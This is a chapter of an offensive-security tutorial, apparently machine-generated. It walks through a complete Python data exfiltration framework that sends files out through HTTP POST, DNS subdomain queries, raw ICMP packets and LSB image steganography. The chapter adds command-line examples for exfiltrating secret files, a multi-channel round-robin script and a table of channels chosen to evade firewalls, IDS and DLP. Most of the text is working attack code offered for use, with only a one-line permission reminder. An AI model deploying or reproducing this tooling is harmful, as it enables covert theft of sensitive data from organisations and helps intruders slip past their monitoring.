# Phase 3: Offensive Tooling & Payload Crafting
## Part 4: Data Exfiltration Methods

### The Target: Data Exfiltration Framework

By the end of this part, you will:
- Understand data exfiltration techniques and channels
- Build covert data extraction modules over HTTP, DNS, and ICMP
- Implement steganography for hiding data in images
- Create tunneling protocols for bypassing firewalls
- Develop comprehensive exfiltration strategies

### The Concept: Understanding Data Exfiltration

Think of data exfiltration like a spy stealing documents from a secure building:

- **Data** = The secret documents you want to steal
- **Exfiltration** = The process of getting the documents out
- **Channel** = How you get the documents out (e.g., through the mail, over the fence)
- **Covert Channel** = Hiding the documents in innocent-looking items
- **Tunneling** = Using one communication method to carry another

**Why We Need Multiple Methods:**
- **Firewalls** block certain traffic
- **IDS/IPS** monitor for suspicious patterns
- **Network Segmentation** restricts access
- **Data Loss Prevention (DLP)** scans for sensitive data

### The Implementation: Data Exfiltration Framework

#### File: `~/hacking-toolkit/exploit/exfiltration.py`

```python
#!/usr/bin/env python3
"""
exfiltration.py - Comprehensive Data Exfiltration Framework
Provides multiple covert channels for data extraction.
"""

import sys
import os
import time
import json
import base64
import hashlib
import binascii
import socket
import struct
import random
import threading
import queue
from typing import Dict, List, Optional, Any, Tuple, BinaryIO
from datetime import datetime
from dataclasses import dataclass, field
import urllib.parse
import zlib

# Try to import for image steganography
try:
    from PIL import Image, ImageDraw
    HAS_PIL = True
except ImportError:
    HAS_PIL = False
    print("[!] PIL not installed. Install with: pip install Pillow")

@dataclass
class ExfiltrationChannel:
    """Container for exfiltration channel information"""
    name: str
    type: str
    config: Dict[str, Any]
    data_sent: int = 0
    data_received: int = 0
    status: str = 'inactive'
    
    def to_dict(self) -> Dict:
        return {
            'name': self.name,
            'type': self.type,
            'config': self.config,
            'data_sent': self.data_sent,
            'data_received': self.data_received,
            'status': self.status
        }

class ExfiltrationBase:
    """Base class for exfiltration channels"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.channel_name = "base"
        self.data_queue = queue.Queue()
        self.running = False
        self.thread = None
        
    def start(self):
        """Start the exfiltration channel"""
        self.running = True
        if self.thread is None:
            self.thread = threading.Thread(target=self._run)
            self.thread.daemon = True
            self.thread.start()
    
    def stop(self):
        """Stop the exfiltration channel"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
    
    def send_data(self, data: bytes):
        """Send data through the channel"""
        self.data_queue.put(data)
    
    def _run(self):
        """Main loop for the channel"""
        while self.running:
            try:
                data = self.data_queue.get(timeout=1)
                self._send(data)
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[-] Channel error: {e}")
    
    def _send(self, data: bytes):
        """Send data implementation (overridden by subclasses)"""
        raise NotImplementedError

class HTTPExfiltration(ExfiltrationBase):
    """
    HTTP-based exfiltration channel
    Uses HTTP requests to exfiltrate data
    """
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.channel_name = "http"
        self.url = config.get('url', 'http://example.com/exfil')
        self.method = config.get('method', 'GET')
        self.param_name = config.get('param_name', 'data')
        self.headers = config.get('headers', {})
        self.session = None
        
        # Import requests here to avoid dependency issues
        try:
            import requests
            self.requests = requests
        except ImportError:
            print("[-] requests library not found. Install with: pip install requests")
    
    def _send(self, data: bytes):
        """Send data via HTTP"""
        try:
            # Encode data
            encoded = base64.b64encode(data).decode('utf-8')
            
            # Split large data into chunks
            chunks = [encoded[i:i+1000] for i in range(0, len(encoded), 1000)]
            
            for chunk in chunks:
                if self.method.upper() == 'GET':
                    url = f"{self.url}?{self.param_name}={urllib.parse.quote(chunk)}"
                    response = self.requests.get(url, headers=self.headers, timeout=5)
                else:
                    response = self.requests.post(
                        self.url,
                        data={self.param_name: chunk},
                        headers=self.headers,
                        timeout=5
                    )
                
                if response.status_code != 200:
                    print(f"[-] HTTP exfil failed: {response.status_code}")
                else:
                    print(f"[+] HTTP exfil success: {len(chunk)} bytes")
                
                time.sleep(0.1)  # Avoid rate limiting
                
        except Exception as e:
            print(f"[-] HTTP exfil error: {e}")

class DNSExfiltration(ExfiltrationBase):
    """
    DNS-based exfiltration channel
    Uses DNS queries to exfiltrate data
    """
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.channel_name = "dns"
        self.domain = config.get('domain', 'example.com')
        self.dns_server = config.get('dns_server', '8.8.8.8')
        self.chunk_size = config.get('chunk_size', 20)  # Max subdomain length
        self.delay = config.get('delay', 0.1)
    
    def _send(self, data: bytes):
        """Send data via DNS queries"""
        try:
            # Encode data
            encoded = base64.b64encode(data).decode('utf-8')
            # Remove padding
            encoded = encoded.replace('=', '')
            
            # Split into chunks
            chunks = [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
            
            for i, chunk in enumerate(chunks):
                # Create subdomain: chunk.domain
                subdomain = f"{chunk}.{self.domain}"
                
                try:
                    # Perform DNS lookup
                    socket.gethostbyname(subdomain)
                    print(f"[+] DNS exfil chunk {i+1}/{len(chunks)}: {subdomain}")
                    
                except socket.gaierror:
                    # This is expected - we just want the query to be sent
                    pass
                
                time.sleep(self.delay)
                
            # Send completion marker
            try:
                socket.gethostbyname(f"done.{self.domain}")
            except:
                pass
                
        except Exception as e:
            print(f"[-] DNS exfil error: {e}")

class ICMPExfiltration(ExfiltrationBase):
    """
    ICMP-based exfiltration channel
    Uses ICMP echo requests (ping) to exfiltrate data
    """
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.channel_name = "icmp"
        self.target = config.get('target', '8.8.8.8')
        self.chunk_size = config.get('chunk_size', 16)
    
    def _send(self, data: bytes):
        """Send data via ICMP packets"""
        try:
            # Encode data
            encoded = base64.b64encode(data).decode('utf-8')
            encoded = encoded.replace('=', '')
            
            # Split into chunks
            chunks = [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
            
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            for i, chunk in enumerate(chunks):
                # Craft ICMP packet with data in payload
                packet = self._create_icmp_packet(chunk)
                
                # Send packet
                sock.sendto(packet, (self.target, 0))
                print(f"[+] ICMP exfil chunk {i+1}/{len(chunks)}: {chunk}")
                
                time.sleep(0.1)
                
            sock.close()
            
        except PermissionError:
            print("[-] ICMP exfil requires root privileges (sudo)")
        except Exception as e:
            print(f"[-] ICMP exfil error: {e}")
    
    def _create_icmp_packet(self, data: str) -> bytes:
        """Create an ICMP packet with data payload"""
        # ICMP echo request structure
        icmp_type = 8  # Echo request
        icmp_code = 0
        icmp_checksum = 0
        icmp_identifier = 12345
        icmp_sequence = 1
        
        # Pack ICMP header
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                                  icmp_identifier, icmp_sequence)
        
        # Add data
        data_bytes = data.encode('utf-8')
        
        # Calculate checksum
        packet = icmp_header + data_bytes
        icmp_checksum = self._calculate_checksum(packet)
        
        # Rebuild packet with checksum
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                                  icmp_identifier, icmp_sequence)
        
        return icmp_header + data_bytes
    
    def _calculate_checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        # Pad to even length
        if len(data) % 2 != 0:
            data += b'\x00'
        
        # Sum 16-bit words
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
        
        # Fold 32-bit to 16-bit
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += (checksum >> 16)
        
        # Complement
        return ~checksum & 0xffff

class SteganographyExfiltration(ExfiltrationBase):
    """
    Steganography-based exfiltration channel
    Hides data in images
    """
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.channel_name = "steganography"
        self.image_path = config.get('image_path', 'cover_image.png')
        self.output_path = config.get('output_path', 'stego_image.png')
        self.method = config.get('method', 'lsb')  # LSB steganography
        self.max_data_size = 0
        
    def _send(self, data: bytes):
        """Hide data in an image"""
        if not HAS_PIL:
            print("[-] PIL not installed. Install with: pip install Pillow")
            return
        
        try:
            # Load the image
            img = Image.open(self.image_path)
            img = img.convert('RGB')
            
            pixels = img.load()
            width, height = img.size
            
            # Calculate capacity
            max_bytes = (width * height * 3) // 8
            self.max_data_size = max_bytes - 10
            
            if len(data) > max_bytes:
                print(f"[-] Data too large ({len(data)} bytes, max {max_bytes})")
                return
            
            # Add header: length of data
            header = struct.pack('!I', len(data))
            data = header + data
            
            # Pad data to fit
            data_bits = self._bytes_to_bits(data)
            
            # Embed data using LSB
            bit_index = 0
            for y in range(height):
                for x in range(width):
                    if bit_index >= len(data_bits):
                        break
                    
                    r, g, b = pixels[x, y]
                    
                    # Modify LSB of each color channel
                    if bit_index < len(data_bits):
                        r = (r & 0xFE) | data_bits[bit_index]
                        bit_index += 1
                    
                    if bit_index < len(data_bits):
                        g = (g & 0xFE) | data_bits[bit_index]
                        bit_index += 1
                    
                    if bit_index < len(data_bits):
                        b = (b & 0xFE) | data_bits[bit_index]
                        bit_index += 1
                    
                    pixels[x, y] = (r, g, b)
                    
                if bit_index >= len(data_bits):
                    break
            
            # Save the stego image
            img.save(self.output_path)
            print(f"[+] Data hidden in {self.output_path}")
            print(f"[+] Original size: {len(data)} bytes, Image capacity: {max_bytes} bytes")
            
        except Exception as e:
            print(f"[-] Steganography error: {e}")
    
    def _bytes_to_bits(self, data: bytes) -> List[int]:
        """Convert bytes to list of bits"""
        bits = []
        for byte in data:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)
        return bits

class ExfiltrationManager:
    """
    Manages multiple exfiltration channels
    Provides coordinated data exfiltration
    """
    
    def __init__(self):
        """Initialize the exfiltration manager"""
        self.channels: Dict[str, ExfiltrationBase] = {}
        self.channel_info: Dict[str, Dict] = {}
        self.worker_thread = None
        self.running = False
        self.data_queue = queue.Queue()
        
    def add_channel(self, channel_type: str, config: Dict[str, Any]) -> str:
        """
        Add an exfiltration channel
        
        Args:
            channel_type: Type of channel ('http', 'dns', 'icmp', 'steganography')
            config: Channel configuration
            
        Returns:
            Channel ID
        """
        channel_id = f"{channel_type}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        
        if channel_type == 'http':
            self.channels[channel_id] = HTTPExfiltration(config)
        elif channel_type == 'dns':
            self.channels[channel_id] = DNSExfiltration(config)
        elif channel_type == 'icmp':
            self.channels[channel_id] = ICMPExfiltration(config)
        elif channel_type == 'steganography':
            self.channels[channel_id] = SteganographyExfiltration(config)
        else:
            raise ValueError(f"Unknown channel type: {channel_type}")
        
        self.channel_info[channel_id] = {
            'type': channel_type,
            'config': config,
            'data_sent': 0,
            'status': 'created'
        }
        
        return channel_id
    
    def start_channel(self, channel_id: str):
        """Start an exfiltration channel"""
        if channel_id in self.channels:
            self.channels[channel_id].start()
            self.channel_info[channel_id]['status'] = 'active'
            print(f"[+] Channel {channel_id} started")
    
    def stop_channel(self, channel_id: str):
        """Stop an exfiltration channel"""
        if channel_id in self.channels:
            self.channels[channel_id].stop()
            self.channel_info[channel_id]['status'] = 'stopped'
            print(f"[+] Channel {channel_id} stopped")
    
    def send_data(self, channel_id: str, data: bytes):
        """Send data through a specific channel"""
        if channel_id in self.channels:
            self.channels[channel_id].send_data(data)
            self.channel_info[channel_id]['data_sent'] += len(data)
    
    def send_data_all(self, data: bytes):
        """Send data through all active channels"""
        for channel_id in self.channels:
            if self.channel_info[channel_id]['status'] == 'active':
                self.send_data(channel_id, data)
    
    def exfiltrate_file(self, filepath: str, channel_id: str = None):
        """
        Exfiltrate a file
        
        Args:
            filepath: Path to file
            channel_id: Channel to use (None = use all active)
        """
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            filename = os.path.basename(filepath)
            file_info = f"FILENAME:{filename}\nSIZE:{len(data)}\n\n".encode('utf-8')
            
            # Send file info and data
            full_data = file_info + data
            
            if channel_id:
                self.send_data(channel_id, full_data)
                print(f"[+] File {filename} sent via {channel_id}")
            else:
                self.send_data_all(full_data)
                print(f"[+] File {filename} sent via all channels")
                
        except Exception as e:
            print(f"[-] File exfil error: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get exfiltration status"""
        return {
            'channels': {
                cid: info for cid, info in self.channel_info.items()
            },
            'total_data_sent': sum(info['data_sent'] for info in self.channel_info.values()),
            'active_channels': len([c for c in self.channel_info.values() if c['status'] == 'active'])
        }

class TunnelProtocol:
    """
    Implements simple tunneling protocols for exfiltration
    """
    
    @staticmethod
    def http_tunnel(data: bytes, config: Dict) -> bytes:
        """
        Tunnel data through HTTP requests
        """
        # Add HTTP headers
        headers = f"GET /{base64.b64encode(data).decode('utf-8')} HTTP/1.1\r\n"
        headers += f"Host: {config.get('host', 'example.com')}\r\n"
        headers += "User-Agent: Mozilla/5.0\r\n\r\n"
        
        return headers.encode('utf-8')
    
    @staticmethod
    def dns_tunnel(data: bytes, config: Dict) -> str:
        """
        Encode data for DNS tunneling
        """
        # Encode data as subdomain
        encoded = base64.b32encode(data).decode('utf-8').lower()
        domain = config.get('domain', 'example.com')
        
        # Split into chunks
        chunks = [encoded[i:i+20] for i in range(0, len(encoded), 20)]
        
        # Create subdomain chain
        subdomain = '.'.join(chunks)
        return f"{subdomain}.{domain}"
    
    @staticmethod
    def icmp_tunnel(data: bytes, config: Dict) -> bytes:
        """
        Encode data for ICMP tunneling
        """
        # ICMP packet with data in payload
        packet = ICMPExfiltration._create_icmp_packet(
            ICMPExfiltration, 
            base64.b64encode(data).decode('utf-8')
        )
        return packet

def main():
    """Interactive exfiltration demonstration"""
    print("="*60)
    print("  DATA EXFILTRATION FRAMEWORK")
    print("="*60)
    
    # Create manager
    manager = ExfiltrationManager()
    
    # Add channels
    print("\n[1] Setting up exfiltration channels...")
    
    # HTTP channel
    http_config = {
        'url': 'http://example.com/exfil',
        'method': 'POST',
        'param_name': 'data',
        'headers': {'User-Agent': 'Mozilla/5.0'}
    }
    http_id = manager.add_channel('http', http_config)
    print(f"[+] HTTP channel added: {http_id}")
    
    # DNS channel
    dns_config = {
        'domain': 'example.com',
        'dns_server': '8.8.8.8',
        'chunk_size': 20
    }
    dns_id = manager.add_channel('dns', dns_config)
    print(f"[+] DNS channel added: {dns_id}")
    
    # ICMP channel (requires root)
    icmp_config = {
        'target': '8.8.8.8',
        'chunk_size': 16
    }
    icmp_id = manager.add_channel('icmp', icmp_config)
    print(f"[+] ICMP channel added: {icmp_id}")
    
    # Steganography channel
    stego_config = {
        'image_path': 'cover_image.png',
        'output_path': 'stego_image.png',
        'method': 'lsb'
    }
    stego_id = manager.add_channel('steganography', stego_config)
    print(f"[+] Steganography channel added: {stego_id}")
    
    # Start channels
    print("\n[2] Starting channels...")
    for channel_id in [http_id, dns_id, icmp_id, stego_id]:
        manager.start_channel(channel_id)
    
    # Test data
    print("\n[3] Sending test data...")
    test_data = b"This is a test exfiltration message"
    manager.send_data_all(test_data)
    
    # Exfiltrate a file
    print("\n[4] Exfiltrating file...")
    
    # Create a test file
    with open('test_exfil.txt', 'w') as f:
        f.write("This is sensitive data!\n")
        f.write("Secret: s3cr3t_p@ssw0rd\n")
        f.write("API Key: 12345-abcdef-67890\n")
    
    manager.exfiltrate_file('test_exfil.txt', http_id)
    
    # Get status
    print("\n[5] Status Report:")
    status = manager.get_status()
    print(json.dumps(status, indent=2))
    
    print("\n[*] Exfiltration framework ready for use")
    print("[*] Remember: Only use this on systems you own or have permission to test")

if __name__ == "__main__":
    # Parse command line arguments
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Data Exfiltration Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # HTTP exfiltration
  python3 exfiltration.py --http -u http://example.com/exfil -f secret.txt
  
  # DNS exfiltration
  python3 exfiltration.py --dns -d example.com -f secret.txt
  
  # ICMP exfiltration (requires root)
  sudo python3 exfiltration.py --icmp -t 8.8.8.8 -f secret.txt
  
  # Steganography
  python3 exfiltration.py --steganography -i cover.png -f secret.txt
  
  # Multiple channels
  python3 exfiltration.py --all -f secret.txt
        """
    )
    
    parser.add_argument('--http', action='store_true', help='Use HTTP channel')
    parser.add_argument('--dns', action='store_true', help='Use DNS channel')
    parser.add_argument('--icmp', action='store_true', help='Use ICMP channel')
    parser.add_argument('--steganography', action='store_true', help='Use steganography')
    parser.add_argument('--all', action='store_true', help='Use all channels')
    parser.add_argument('-u', '--url', help='HTTP exfil URL')
    parser.add_argument('-d', '--domain', help='DNS exfil domain')
    parser.add_argument('-t', '--target', default='8.8.8.8', help='ICMP target')
    parser.add_argument('-i', '--image', help='Image for steganography')
    parser.add_argument('-f', '--file', required=True, help='File to exfiltrate')
    parser.add_argument('-o', '--output', help='Output file for stego image')
    
    args = parser.parse_args()
    
    manager = ExfiltrationManager()
    channel_ids = []
    
    # Add channels based on arguments
    if args.http or args.all:
        config = {
            'url': args.url or 'http://example.com/exfil',
            'method': 'POST',
            'param_name': 'data'
        }
        channel_id = manager.add_channel('http', config)
        channel_ids.append(channel_id)
        manager.start_channel(channel_id)
    
    if args.dns or args.all:
        config = {
            'domain': args.domain or 'example.com',
            'dns_server': '8.8.8.8'
        }
        channel_id = manager.add_channel('dns', config)
        channel_ids.append(channel_id)
        manager.start_channel(channel_id)
    
    if args.icmp or args.all:
        config = {
            'target': args.target,
            'chunk_size': 16
        }
        channel_id = manager.add_channel('icmp', config)
        channel_ids.append(channel_id)
        manager.start_channel(channel_id)
    
    if args.steganography or args.all:
        config = {
            'image_path': args.image or 'cover_image.png',
            'output_path': args.output or 'stego_image.png',
            'method': 'lsb'
        }
        channel_id = manager.add_channel('steganography', config)
        channel_ids.append(channel_id)
        manager.start_channel(channel_id)
    
    # Exfiltrate file
    if channel_ids:
        for channel_id in channel_ids:
            manager.exfiltrate_file(args.file, channel_id)
    else:
        print("[-] No channels specified. Use --help for options.")
        sys.exit(1)
    
    # Show status
    print("\n[*] Status:")
    status = manager.get_status()
    print(json.dumps(status, indent=2))
```

### The Verification: Testing Exfiltration

#### Test 1: HTTP Exfiltration

```bash
cd ~/hacking-toolkit/exploit

# Create a test file
echo "Secret data: s3cr3t_k3y_123" > secret.txt

# Exfiltrate via HTTP
python3 exfiltration.py --http -u http://httpbin.org/post -f secret.txt
```

#### Test 2: DNS Exfiltration

```bash
# Exfiltrate via DNS (requires DNS server to capture queries)
python3 exfiltration.py --dns -d example.com -f secret.txt
```

#### Test 3: Steganography

```bash
# Create a cover image (if you have one)
# If not, we'll create one for demonstration

# Exfiltrate via steganography
python3 exfiltration.py --steganography -i cover_image.png -f secret.txt
```

### Advanced Usage: Multi-Channel Exfiltration

```python
# Multi-channel exfiltration example
cat > multi_exfil.py << 'EOF'
#!/usr/bin/env python3
from exfiltration import ExfiltrationManager
import json
import time

# Create manager
manager = ExfiltrationManager()

# Configure multiple channels
channels = [
    {
        'type': 'http',
        'config': {
            'url': 'http://example.com/exfil',
            'method': 'POST',
            'param_name': 'data'
        }
    },
    {
        'type': 'dns',
        'config': {
            'domain': 'example.com',
            'dns_server': '8.8.8.8'
        }
    }
]

# Add and start channels
for channel in channels:
    channel_id = manager.add_channel(channel['type'], channel['config'])
    manager.start_channel(channel_id)
    print(f"[+] Started {channel['type']} channel: {channel_id}")

# Data to exfiltrate
data = b"This is sensitive data that needs to be exfiltrated"

# Split data and send through different channels
chunk_size = 50
chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

for i, chunk in enumerate(chunks):
    # Round-robin distribution
    channel_ids = list(manager.channels.keys())
    channel_id = channel_ids[i % len(channel_ids)]
    
    print(f"[*] Sending chunk {i+1}/{len(chunks)} via {channel_id}")
    manager.send_data(channel_id, chunk)
    
    time.sleep(0.5)

# Check status
print("\n[*] Final Status:")
print(json.dumps(manager.get_status(), indent=2))
EOF

python3 multi_exfil.py
```

### Troubleshooting Common Issues

#### 1. DNS Exfiltration Not Working

```bash
# Check DNS resolution
dig example.com

# Test with specific DNS server
nslookup example.com 8.8.8.8
```

#### 2. ICMP Requires Root

```bash
# Run with sudo
sudo python3 exfiltration.py --icmp -t 8.8.8.8 -f secret.txt
```

#### 3. Steganography Image Size

```python
# Calculate capacity
from PIL import Image
img = Image.open('image.png')
width, height = img.size
capacity = (width * height * 3) // 8
print(f"Capacity: {capacity} bytes")
```

### Reference: Exfiltration Channels

| Channel | Pros | Cons | Use Case |
|---------|------|------|----------|
| HTTP | Common, easy to implement | Logged, suspicious patterns | Web traffic environments |
| DNS | Often allowed through firewalls | Query size limits | Restricted networks |
| ICMP | Simple, not commonly logged | Requires raw sockets | Network monitoring bypass |
| Steganography | Very stealthy | Limited capacity | Visual media environments |
| Email | Common protocol | Logged, scanned | Corporate environments |

---

**[GENERATED: Phase 3, Part 4: Data Exfiltration Methods]**

**[COMPLETED: Phase 3: Offensive Tooling & Payload Crafting]**

**[STARTING: Phase 4: Post-Exploitation & Automation Frameworks]**
**[STARTING: Phase 4, Part 1: C2 Channel Development]**
